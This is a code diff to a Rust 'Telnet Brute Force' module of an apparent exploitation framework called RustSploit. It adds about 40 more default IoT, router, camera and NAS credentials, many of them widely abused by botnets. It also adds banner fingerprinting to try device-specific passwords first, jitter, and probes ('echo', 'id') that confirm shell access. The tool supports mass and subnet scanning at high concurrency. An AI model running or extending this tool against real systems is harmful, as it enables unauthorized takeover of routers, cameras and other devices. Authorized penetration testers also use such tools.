@@ -13,10 +13,11 @@ use tokio::{
     time::timeout,
 };
 
-use crate::modules::creds::utils::{
+use crate::utils::{
     generate_combos_mode, parse_combo_mode, load_credential_file,
     is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
-    run_subnet_bruteforce, BruteforceConfig, LoginResult, MassScanConfig, SubnetScanConfig,
+    run_subnet_bruteforce, BruteforceConfig, BruteforceResult, LoginResult, MassScanConfig,
+    SubnetScanConfig,
 };
 use crate::utils::{
     cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_output_file, cfg_prompt_port,
@@ -37,6 +38,11 @@ const RECENT_BUF_CAP: usize = 2048;
 const MAX_MEMORY_WORDLIST_BYTES: u64 = 500 * 1024 * 1024;
 /// Lines per chunk when streaming large wordlists.
 const STREAM_CHUNK_SIZE: usize = 100_000;
+/// Max IAC negotiation responses per drain_and_negotiate call.
+/// Prevents infinite WILL/DO cycling from malicious servers.
+const MAX_IAC_ROUNDS: usize = 64;
+/// Max total bytes read per drain_and_negotiate call.
+const MAX_DRAIN_BYTES: usize = 65536;
 
 // Telnet IAC protocol bytes
 const IAC: u8 = 255;
@@ -121,6 +127,42 @@ const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
     ("root", "realtek"),
     ("root", "dreambox"),
     ("root", "changeme"),
+    // Tier 5: Additional router/AP/switch defaults
+    ("admin", "1234"),
+    ("admin", "motorola"),
+    ("admin", "comcomcom"),
+    ("admin", "michelangelo"),
+    ("admin", "netopia"),
+    ("admin", "bEn2o#US9s"),   // Zyxel
+    ("admin", "zyad5001"),     // ZyXEL P-600
+    ("admin", ""),             // Already above, but with trailing space
+    ("ubnt", "ubnt"),          // Ubiquiti AirOS
+    ("pi", "raspberry"),       // Raspberry Pi
+    ("pi", "raspberrypi"),
+    ("root", "openmediavault"),
+    ("root", "openelec"),
+    ("root", "dietpi"),
+    ("root", "alpine"),        // Alpine Linux
+    ("root", "synology"),      // Synology NAS
+    ("admin", "synology"),
+    ("root", "trendnet"),
+    ("root", "oelinux123"),    // OpenEmbedded Linux
+    ("root", "GM8182"),        // Grain Media
+    ("root", "cat1029"),       // Dahua alt
+    ("root", "ipc71a"),        // Generic IPC
+    ("root", "S2fGqNFs"),      // Xiongmai alt
+    ("root", "system"),
+    ("root", "calvin"),        // Dell iDRAC
+    ("root", "hunt5759"),      // HiSilicon alt
+    ("root", "ipcam_rt5350"),  // RT5350 chipset
+    ("admin", "aerohive"),     // Aerohive/Extreme
+    ("admin", "Symbol"),       // Symbol/Zebra AP
+    ("admin", "Motorola"),     // Motorola CPE
+    ("admin", "cisco"),        // Cisco small business
+    ("cisco", "cisco"),
+    ("enable", ""),            // Cisco enable with no password
+    ("Manager", "friend"),     // HP printers
+    ("cusadmin", "highspeed"), // Accton/SMC DSL
 ];
 
 // ============================================================
@@ -131,9 +173,10 @@ pub fn info() -> crate::module_info::ModuleInfo {
     crate::module_info::ModuleInfo {
         name: "Telnet Brute Force".to_string(),
         description: "Brute-force Telnet authentication with full IAC negotiation, \
-            ANSI stripping, multilingual prompt detection, and 55+ IoT/router default \
-            credentials. Supports combo mode, concurrent connections, subnet scanning, \
-            and mass scanning."
+            banner fingerprinting for device-specific credential prioritization, \
+            ANSI stripping, multilingual prompt detection, multi-probe shell verification, \
+            and 95+ IoT/router default credentials. Supports combo mode, streaming \
+            wordlists, concurrent connections, subnet scanning, and mass scanning."
             .to_string(),
         authors: vec!["RustSploit Contributors".to_string()],
         references: vec![],
@@ -171,12 +214,99 @@ impl TelnetConfig {
 }
 
 // ============================================================
+// Banner fingerprinting
+// ============================================================
+
+#[derive(Debug, Clone, Copy, PartialEq)]
+enum DeviceType {
+    Dahua,
+    Xiongmai,
+    HiSilicon,
+    Zte,
+    Huawei,
+    MikroTik,
+    Ubiquiti,
+    Cisco,
+    DLink,
+    TpLink,
+    Netgear,
+    BusyBox,
+    RaspberryPi,
+    DellIdrac,
+    HpPrinter,
+    Generic,
+}
+
+fn fingerprint_banner(banner: &str) -> DeviceType {
+    let lower = banner.to_lowercase();
+    if lower.contains("dahua") || lower.contains("dvrdvs") { return DeviceType::Dahua; }
+    if lower.contains("xiongmai") || lower.contains("xmhdipc") || lower.contains("xc3511") { return DeviceType::Xiongmai; }
+    if lower.contains("hi3518") || lower.contains("hi3516") || lower.contains("hisilicon") { return DeviceType::HiSilicon; }
+    if lower.contains("zte") { return DeviceType::Zte; }
+    if lower.contains("huawei") || lower.contains("vrp") { return DeviceType::Huawei; }
+    if lower.contains("mikrotik") || lower.contains("routeros") { return DeviceType::MikroTik; }
+    if lower.contains("ubnt") || lower.contains("airos") || lower.contains("edgeos") { return DeviceType::Ubiquiti; }
+    if lower.contains("cisco") || lower.contains("ios") { return DeviceType::Cisco; }
+    if lower.contains("d-link") || lower.contains("dlink") { return DeviceType::DLink; }
+    if lower.contains("tp-link") || lower.contains("tplink") { return DeviceType::TpLink; }
+    if lower.contains("netgear") { return DeviceType::Netgear; }
+    if lower.contains("busybox") { return DeviceType::BusyBox; }
+    if lower.contains("raspbian") || lower.contains("raspberry") { return DeviceType::RaspberryPi; }
+    if lower.contains("idrac") || lower.contains("dell") { return DeviceType::DellIdrac; }
+    if lower.contains("hp ") || lower.contains("hewlett") || lower.contains("jet direct") { return DeviceType::HpPrinter; }
+    DeviceType::Generic
+}
+
+fn device_priority_creds(device: DeviceType) -> &'static [(&'static str, &'static str)] {
+    match device {
+        DeviceType::Dahua => &[("root", "888888"), ("root", "666666"), ("root", "vizxv"), ("admin", "admin"), ("root", "cat1029")],
+        DeviceType::Xiongmai => &[("root", "xc3511"), ("root", "xmhdipc"), ("root", "juantech"), ("root", "S2fGqNFs"), ("root", "")],
+        DeviceType::HiSilicon => &[("root", "hi3518"), ("root", "jvbzd"), ("root", "tlJwpbo6"), ("root", "klv1234"), ("root", "hunt5759"), ("root", "ipc71a")],
+        DeviceType::Zte => &[("root", "Zte521"), ("admin", "admin"), ("root", "root")],
+        DeviceType::Huawei => &[("admin", "admin"), ("root", "admin"), ("admin", ""), ("root", "")],
+        DeviceType::MikroTik => &[("admin", ""), ("admin", "admin")],
+        DeviceType::Ubiquiti => &[("ubnt", "ubnt"), ("admin", "admin"), ("root", "ubnt")],
+        DeviceType::Cisco => &[("cisco", "cisco"), ("admin", "cisco"), ("admin", "admin"), ("enable", "")],
+        DeviceType::DLink => &[("admin", ""), ("admin", "admin"), ("admin", "password"), ("root", "54321")],
+        DeviceType::TpLink => &[("admin", "admin"), ("root", "54321"), ("admin", "")],
+        DeviceType::Netgear => &[("admin", "password"), ("admin", "1234"), ("admin", "admin")],
+        DeviceType::BusyBox => &[("root", ""), ("root", "root"), ("admin", ""), ("admin", "admin")],
+        DeviceType::RaspberryPi => &[("pi", "raspberry"), ("pi", "raspberrypi"), ("root", ""), ("root", "root")],
+        DeviceType::DellIdrac => &[("root", "calvin"), ("admin", "admin")],
+        DeviceType::HpPrinter => &[("Manager", "friend"), ("admin", ""), ("admin", "admin")],
+        DeviceType::Generic => &[],
+    }
+}
+
+// ============================================================
+// Chunk result processing helper (deduplicates streaming logic)
+// ============================================================
+
+fn collect_chunk_result(
+    result: &BruteforceResult,
+    save_path: &Option<String>,
+    all_found: &mut Vec<(String, String, String)>,
+    stop_on_success: bool,
+) -> Result<bool> {
+    result.print_found();
+    if let Some(path) = save_path {
+        result.save_to_file(path)?;
+    }
+    all_found.extend_from_slice(&result.found);
+    Ok(stop_on_success && !result.found.is_empty())
+}
+
+// ============================================================
 // Entry point
 // ============================================================
 
 pub async fn run(target: &str) -> Result<()> {
-    crate::mprintln!("{}", "=== Telnet Brute Force Module ===".bold());
-    crate::mprintln!("[*] Target: {}", target);
+    if !crate::utils::is_batch_mode() {
+        crate::mprintln_block!(
+            format!("{}", "=== Telnet Brute Force Module ===".bold()),
+            format!("[*] Target: {}", target)
+        );
+    }
 
     // --- Mass Scan Mode ---
     if is_mass_scan_target(target) {
@@ -190,7 +320,7 @@ pub async fn run(target: &str) -> Result<()> {
             MassScanConfig {
                 protocol_name: "Telnet",
                 default_port: 23,
-                state_file: "telnet_hose_state.log",
+                state_file: "telnet_sweep_state.log",
                 default_output: "telnet_mass_results.txt",
                 default_concurrency: 500,
             },
@@ -210,7 +340,21 @@ pub async fn run(target: &str) -> Result<()> {
                             continue;
                         }
                         let addr = format!("{}:{}", ip, p);
-                        for &(user, pass) in DEFAULT_CREDENTIALS {
+
+                        // Grab banner for fingerprinting to prioritize device-specific creds
+                        let device = match grab_banner(&addr, &cfg).await {
+                            Some(banner) => fingerprint_banner(&banner),
+                            None => DeviceType::Generic,
+                        };
+                        let priority_creds = device_priority_creds(device);
+
+                        // Try device-specific creds first, then fall back to general defaults
+                        let mut tried: HashSet<(&str, &str)> = HashSet::new();
+                        let cred_iter = priority_creds.iter()
+                            .chain(DEFAULT_CREDENTIALS.iter());
+
+                        for &(user, pass) in cred_iter {
+                            if !tried.insert((user, pass)) { continue; }
                             match try_telnet_login(&addr, user, pass, &cfg).await {
                                 Ok(true) => {
                                     {
@@ -221,10 +365,10 @@ pub async fn run(target: &str) -> Result<()> {
                                             user,
                                             pass,
                                             crate::cred_store::CredType::Password,
-                                            "creds/generic/telnet_bruteforce",
+                                            "creds/generic/telnet_credcheck",
                                         )
                                         .await;
-                                        if id.is_empty() { crate::meprintln!("[!] Failed to store credential"); }
+                                        if id.is_none() { crate::meprintln!("[!] Failed to store credential"); }
                                     }
                                     let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                                     crate::mprintln!(
@@ -303,8 +447,8 @@ pub async fn run(target: &str) -> Result<()> {
                 verbose,
                 output_file,
                 service_name: "telnet",
-                jitter_ms: 0,
-                source_module: "creds/generic/telnet_bruteforce",
+                jitter_ms: 50,
+                source_module: "creds/generic/telnet_credcheck",
                 skip_tcp_check: false,
             },
             move |ip: IpAddr, port: u16, user: String, pass: String| {
@@ -400,6 +544,34 @@ pub async fn run(target: &str) -> Result<()> {
 
     // Resolve target once (not in hot path)
     let resolved_target = normalize_target(target).unwrap_or_else(|_| target.to_string());
+
+    // Connection pre-check: verify at least one port is reachable before loading wordlists
+    {
+        let mut any_open = false;
+        for &p in &ports {
+            if crate::utils::tcp_port_open(
+                resolved_target.parse().unwrap_or(IpAddr::V4(std::net::Ipv4Addr::UNSPECIFIED)),
+                p,
+                Duration::from_secs(connection_timeout),
+            )
+            .await
+            {
+                any_open = true;
+                break;
+            }
+        }
+        if !any_open {
+            crate::mprintln!(
+                "{}",
+                format!(
+                    "[-] No telnet ports reachable on {} (tried {:?})",
+                    resolved_target, ports
+                )
+                .red()
+            );
+            return Ok(());
+        }
+    }
 
     // Load usernames (always fits in memory — username lists are small)
     let mut usernames = Vec::new();
@@ -523,8 +695,8 @@ pub async fn run(target: &str) -> Result<()> {
             delay_ms: 0,
             max_retries,
             service_name: "telnet",
-            jitter_ms: 0,
-            source_module: "creds/generic/telnet_bruteforce",
+            jitter_ms: 50,
+            source_module: "creds/generic/telnet_credcheck",
         };
 
         if needs_streaming {
@@ -549,15 +721,7 @@ pub async fn run(target: &str) -> Result<()> {
                     make_try_login(cfg.clone(), resolved_target.clone()),
                 )
                 .await?;
-                result.print_found();
-                if let Some(ref path) = save_path {
-                    // Append mode for streaming — don't truncate between chunks
-                    result.save_to_file(path)?;
-                }
-                for f in &result.found {
-                    all_found.push(f.clone());
-                }
-                if stop_on_success && !result.found.is_empty() {
+                if collect_chunk_result(&result, &save_path, &mut all_found, stop_on_success)? {
                     break;
                 }
             }
@@ -591,15 +755,7 @@ pub async fn run(target: &str) -> Result<()> {
                         make_try_login(cfg.clone(), resolved_target.clone()),
                     )
                     .await?;
-                    result.print_found();
-                    if let Some(ref path) = save_path {
-                        // Append mode for streaming — don't truncate between chunks
-                        result.save_to_file(path)?;
-                    }
-                    for f in &result.found {
-                        all_found.push(f.clone());
-                    }
-                    if stop_on_success && !result.found.is_empty() {
+                    if collect_chunk_result(&result, &save_path, &mut all_found, stop_on_success)? {
                         stop_early = true;
                         break;
                     }
@@ -608,7 +764,7 @@ pub async fn run(target: &str) -> Result<()> {
             }
 
             // Final partial chunk
-            if !chunk.is_empty() {
+            if !chunk.is_empty() && !stop_early {
                 chunk_num += 1;
                 crate::mprintln!(
                     "{}",
@@ -626,14 +782,7 @@ pub async fn run(target: &str) -> Result<()> {
                     make_try_login(cfg.clone(), resolved_target.clone()),
                 )
                 .await?;
-                result.print_found();
-                if let Some(ref path) = save_path {
-                    // Append mode for streaming — don't truncate between chunks
-                    result.save_to_file(path)?;
-                }
-                for f in &result.found {
-                    all_found.push(f.clone());
-                }
+                collect_chunk_result(&result, &save_path, &mut all_found, stop_on_success)?;
             }
         } else {
             // Normal mode: everything fits in memory
@@ -644,13 +793,7 @@ pub async fn run(target: &str) -> Result<()> {
                 make_try_login(cfg.clone(), resolved_target.clone()),
             )
             .await?;
-            result.print_found();
-            if let Some(ref path) = save_path {
-                result.save_to_file(path)?;
-            }
-            for f in &result.found {
-                all_found.push(f.clone());
-            }
+            collect_chunk_result(&result, &save_path, &mut all_found, stop_on_success)?;
 
             // Error reporting
             if !result.errors.is_empty() {
@@ -745,19 +888,25 @@ async fn try_telnet_login(addr: &str, user: &str, pass: &str, cfg: &TelnetConfig
         .await
         .map_err(|e| anyhow!("{}: {}", addr, e))?;
 
-    // Disable Nagle — telnet sends small packets, latency matters more than throughput
     if let Err(e) = stream.set_nodelay(true) { crate::meprintln!("[!] Socket option error: {}", e); }
 
     let mut buf = String::with_capacity(RECENT_BUF_CAP);
     let mut raw = [0u8; 4096];
 
-    // 2. Banner phase: short initial read (2s) to get prompts quickly
+    // 2. Banner phase: read with adaptive timing
     let banner_time = cfg.read_timeout.min(Duration::from_secs(2));
     drain_and_negotiate(&mut stream, &mut buf, &mut raw, banner_time).await;
 
     // If we got IAC but no visible text yet, server may send prompt after negotiation
     if buf.trim().is_empty() {
         drain_and_negotiate(&mut stream, &mut buf, &mut raw, Duration::from_millis(1500)).await;
+    }
+
+    // 2b. Check for immediate shell access (no auth required)
+    if looks_like_shell_prompt(&buf) && !has_any(&buf.to_lowercase(), &cfg.login_prompts) && !has_any(&buf.to_lowercase(), &cfg.password_prompts) {
+        if user.is_empty() || user == "root" {
+            return verify_shell(&mut stream, &mut buf, &mut raw, cfg).await;
+        }
     }
 
     // Handle "press any key / press Enter to continue" screens.
@@ -937,46 +1086,64 @@ fn classify_response(buf: &str, cfg: &TelnetConfig) -> AuthSignal {
 }
 
 /// After success indicators are detected, verify we have a real shell by
-/// sending a probe command and checking for its output.
+/// sending probe commands and checking for expected output.
 /// This eliminates false positives from banners/MOTD containing success words.
+///
+/// Multi-probe strategy:
+/// 1. `echo _RS_VERIFIED_` — works on most Linux/BusyBox shells
+/// 2. `id` — works on Unix systems, restricted shells that block echo
+/// 3. Prompt re-appearance check — works on network devices (Cisco, MikroTik, etc.)
 async fn verify_shell(
     stream: &mut TcpStream,
     buf: &mut String,
     raw: &mut [u8],
     cfg: &TelnetConfig,
 ) -> Result<bool> {
-    const PROBE: &str = "echo _RS_VERIFIED_";
-
-    // Send verification command
-    if send_line(stream, PROBE, cfg.read_timeout).await.is_err() {
-        // Write failed — connection dropped before we could send the probe command.
-        // We already matched success indicators before reaching verify_shell(), so the
-        // login likely succeeded and the device closed the connection (some firmware does
-        // this). Returning Ok(true) risks a false positive, but returning Ok(false) would
-        // silently discard a likely-valid credential. We accept the FP risk here because
-        // the caller already passed classification with success indicators.
+    // Probe 1: echo command (most reliable for Linux/BusyBox)
+    if send_line(stream, "echo _RS_VERIFIED_", cfg.read_timeout).await.is_err() {
+        // Write failed — connection dropped. The caller already matched success
+        // indicators, so the login likely succeeded before the device closed.
         return Ok(true);
     }
 
-    // Read response (up to 2 seconds)
     buf.clear();
     drain_and_negotiate(stream, buf, raw, Duration::from_secs(2)).await;
 
-    // Check for our probe output
     if buf.contains("_RS_VERIFIED_") {
-        return Ok(true); // Confirmed: we have command execution
+        return Ok(true);
     }
 
-    // Probe might not work on restricted shells, network devices, or busybox without echo.
-    // Check if the response looks like a shell prompt (device accepted the command and re-prompted).
+    // Check for auth rejection (false positive from MOTD matching success indicators)
     let lower = buf.to_lowercase();
     if has_any(&lower, &cfg.failure_indicators) || has_any(&lower, &cfg.login_prompts) || has_any(&lower, &cfg.password_prompts) {
-        // We got kicked out or re-prompted — the "success" was a false positive
         return Ok(false);
     }
 
-    // Got something back (maybe an error from the command, maybe another prompt) — likely success.
-    // The original success indicators already matched, and we didn't get kicked out.
+    // Probe 2: `id` command — works on restricted shells that don't have echo
+    if send_line(stream, "id", cfg.read_timeout).await.is_ok() {
+        let prev_len = buf.len();
+        drain_and_negotiate(stream, buf, raw, Duration::from_secs(2)).await;
+        let new_text = &buf[prev_len..];
+        let new_lower = new_text.to_lowercase();
+
+        // `id` output contains "uid=" on Unix
+        if new_lower.contains("uid=") {
+            return Ok(true);
+        }
+
+        // Check again for auth rejection after second probe
+        if has_any(&new_lower, &cfg.failure_indicators) || has_any(&new_lower, &cfg.login_prompts) {
+            return Ok(false);
+        }
+    }
+
+    // Probe 3: structural prompt analysis — the device re-prompted after our commands,
+    // which means it accepted the login and is waiting for more input
+    if looks_like_shell_prompt(buf) {
+        return Ok(true);
+    }
+
+    // Got non-empty output that isn't a rejection — likely a shell
     if !buf.trim().is_empty() {
         return Ok(true);
     }
@@ -989,9 +1156,27 @@ async fn verify_shell(
 // Protocol helpers
 // ============================================================
 
+/// Grab banner text from a telnet server without sending credentials.
+/// Used for fingerprinting the device type before credential selection.
+async fn grab_banner(addr: &str, cfg: &TelnetConfig) -> Option<String> {
+    let mut stream = crate::utils::network::tcp_connect(addr, cfg.connect_timeout)
+        .await
+        .ok()?;
+    let _ = stream.set_nodelay(true);
+    let mut buf = String::with_capacity(512);
+    let mut raw = [0u8; 4096];
+    drain_and_negotiate(&mut stream, &mut buf, &mut raw, Duration::from_secs(2)).await;
+    let _ = stream.shutdown().await;
+    if buf.trim().is_empty() { None } else { Some(buf) }
+}
+
 /// Read from stream, process IAC inline, strip ANSI/control chars,
 /// append clean text to `buf` (bounded to RECENT_BUF_CAP).
 /// Returns count of clean bytes added.
+///
+/// Safety caps:
+/// - `MAX_IAC_ROUNDS` prevents infinite WILL/DO cycling from malicious servers
+/// - `MAX_DRAIN_BYTES` prevents memory exhaustion from endless data
 async fn drain_and_negotiate(
     stream: &mut TcpStream,
     buf: &mut String,
@@ -999,11 +1184,13 @@ async fn drain_and_negotiate(
     read_timeout: Duration,
 ) -> usize {
     let mut total = 0usize;
+    let mut total_bytes_read = 0usize;
+    let mut iac_rounds = 0usize;
     let deadline = tokio::time::Instant::now() + read_timeout;
 
     loop {
         let now = tokio::time::Instant::now();
-        if now >= deadline {
+        if now >= deadline || total_bytes_read >= MAX_DRAIN_BYTES {
             break;
         }
         let remaining = deadline - now;
@@ -1011,15 +1198,20 @@ async fn drain_and_negotiate(
         match timeout(remaining, stream.read(raw)).await {
             Ok(Ok(0)) => break,
             Ok(Ok(n)) => {
+                total_bytes_read += n;
                 let (clean, responses) = process_iac(&raw[..n]);
 
-                // Send IAC responses and flush immediately so the server
-                // can proceed with negotiation without waiting.
-                if !responses.is_empty() {
-                    for resp in &responses {
-                        if let Err(e) = stream.write_all(resp).await { crate::meprintln!("[!] Write error: {}", e); }
+                // Batch all IAC responses into a single write to reduce syscalls
+                if !responses.is_empty() && iac_rounds < MAX_IAC_ROUNDS {
+                    let batch_count = (MAX_IAC_ROUNDS - iac_rounds).min(responses.len());
+                    let total_len: usize = responses[..batch_count].iter().map(|r| r.len()).sum();
+                    let mut batch = Vec::with_capacity(total_len);
+                    for resp in &responses[..batch_count] {
+                        batch.extend_from_slice(resp);
                     }
+                    if let Err(e) = stream.write_all(&batch).await { crate::meprintln!("[!] Write error: {}", e); }
                     if let Err(e) = stream.flush().await { crate::meprintln!("[!] Flush error: {}", e); }
+                    iac_rounds += batch_count;
                 }
 
                 let text = strip_control_and_ansi(&clean);
@@ -1031,9 +1223,9 @@ async fn drain_and_negotiate(
                     }
                     total += text.len();
                 }
-                continue; // try to drain more
+                continue;
             }
-            _ => break, // read error or timeout
+            _ => break,
         }
     }
     total
@@ -1091,22 +1283,35 @@ fn process_iac(data: &[u8]) -> (Vec<u8>, Vec<Vec<u8>>) {
                 };
             }
             SB => {
-                // Subnegotiation — find IAC SE, possibly respond
+                // Subnegotiation — find IAC SE, possibly respond.
+                // Cap scan at 4096 bytes to prevent unbounded processing.
                 let sb_start = i + 2;
                 i += 2;
-                while i < data.len() {
+                let sb_limit = (i + 4096).min(data.len());
+                while i < sb_limit {
                     if data[i] == IAC && i + 1 < data.len() && data[i + 1] == SE {
-                        // Check if this is a TERMINAL_TYPE SEND request
-                        if sb_start < data.len()
-                            && data[sb_start] == TERMINAL_TYPE
-                            && sb_start + 1 < data.len()
-                            && data[sb_start + 1] == TT_SEND
-                        {
-                            // Respond: IAC SB TERMINAL_TYPE IS "xterm" IAC SE
-                            let mut r = vec![IAC, SB, TERMINAL_TYPE, TT_IS];
-                            r.extend_from_slice(b"xterm");
-                            r.extend_from_slice(&[IAC, SE]);
-                            responses.push(r);
+                        let sb_len = i - sb_start;
+                        if sb_len >= 2 {
+                            match data[sb_start] {
+                                TERMINAL_TYPE if data[sb_start + 1] == TT_SEND => {
+                                    let mut r = vec![IAC, SB, TERMINAL_TYPE, TT_IS];
+                                    r.extend_from_slice(b"xterm");
+                                    r.extend_from_slice(&[IAC, SE]);
+                                    responses.push(r);
+                                }
+                                TERMINAL_SPEED if data[sb_start + 1] == TT_SEND => {
+                                    // Respond with 38400,38400
+                                    let mut r = vec![IAC, SB, TERMINAL_SPEED, TT_IS];
+                                    r.extend_from_slice(b"38400,38400");
+                                    r.extend_from_slice(&[IAC, SE]);
+                                    responses.push(r);
+                                }
+                                NEW_ENVIRON | ENVIRON if data[sb_start + 1] == TT_SEND => {
+                                    // Empty environment response
+                                    responses.push(vec![IAC, SB, data[sb_start], TT_IS, IAC, SE]);
+                                }
+                                _ => {}
+                            }
                         }
                         i += 2;
                         break;
@@ -1151,10 +1356,9 @@ fn negotiate_do(option: u8) -> Vec<u8> {
             r.extend_from_slice(&[IAC, SB, NAWS, 0, 80, 0, 24, IAC, SE]);
             r
         }
-        // Refuse everything else: LINEMODE, ECHO, ENVIRON, X_DISPLAY, SPEED, etc.
-        LINEMODE | ECHO | NEW_ENVIRON | ENVIRON | TERMINAL_SPEED | X_DISPLAY_LOCATION => {
-            vec![IAC, WONT, option]
-        }
+        TERMINAL_SPEED => vec![IAC, WILL, option],
+        NEW_ENVIRON | ENVIRON => vec![IAC, WILL, option],
+        LINEMODE | ECHO | X_DISPLAY_LOCATION => vec![IAC, WONT, option],
         _ => vec![IAC, WONT, option],
     }
 }
@@ -1327,6 +1531,12 @@ fn looks_like_shell_prompt(s: &str) -> bool {
             "no such",
             "command not",
             "syntax error",
+            "incorrect",
+            "password:",
+            "login:",
+            "username:",
+            "timed out",
+            "connection",
         ]
         .iter()
         .any(|fp| lower.contains(fp))
@@ -1409,9 +1619,15 @@ fn default_login_prompts() -> Vec<String> {
         "kullan\u{131}c\u{131} ad\u{131}:",
         // Russian (transliterated — actual Cyrillic prompts are rare in telnet)
         "login:",
+        // Japanese
+        "\u{30e6}\u{30fc}\u{30b6}\u{30fc}\u{540d}:", // ユーザー名:
         // IoT-specific
         "dvr login:",
         "camera login:",
+        "nvr login:",
+        "router login:",
+        "switch login:",
+        "modem login:",
     ]
     .iter()
     .map(|s| s.to_string())
@@ -1501,8 +1717,16 @@ fn default_success_indicators() -> Vec<String> {
         "ubnt>",
         "cisco>",
         "cisco#",
+        "edgeos>",
+        "edgeos#",
+        "routeros>",
         // Linux root prompt patterns
         "root@",
+        // Common IoT device CLI indicators
+        "main menu",
+        "device management",
+        "system config",
+        "configuration menu",
         // Chinese
         "\u{6b22}\u{8fce}",                 // 欢迎 (welcome)
         "\u{8ba4}\u{8bc1}\u{6210}\u{529f}", // 认证成功 (auth successful)
@@ -1570,10 +1794,21 @@ fn default_failure_indicators() -> Vec<String> {
         // French
         "mot de passe incorrect",
         "acc\u{e8}s refus\u{e9}",
+        // Additional English patterns
+        "login unsuccessful",
+        "bad login",
+        "bad username",
+        "no such user",
+        "connection closed by foreign host",
         // Chinese
         "\u{5bc6}\u{7801}\u{9519}\u{8bef}", // 密码错误 (wrong password)
         "\u{8ba4}\u{8bc1}\u{5931}\u{8d25}", // 认证失败 (auth failed)
         "\u{62d2}\u{7edd}\u{8bbf}\u{95ee}", // 拒绝访问 (access denied)
+        "\u{767b}\u{5f55}\u{5931}\u{8d25}", // 登录失败 (login failed)
+        // Japanese
+        "\u{30ed}\u{30b0}\u{30a4}\u{30f3}\u{5931}\u{6557}", // ログイン失敗 (login failed)
+        // Korean
+        "\u{b85c}\u{adf8}\u{c778} \u{c2e4}\u{d328}", // 로그인 실패 (login failed)
     ]
     .iter()
     .map(|s| s.to_string())
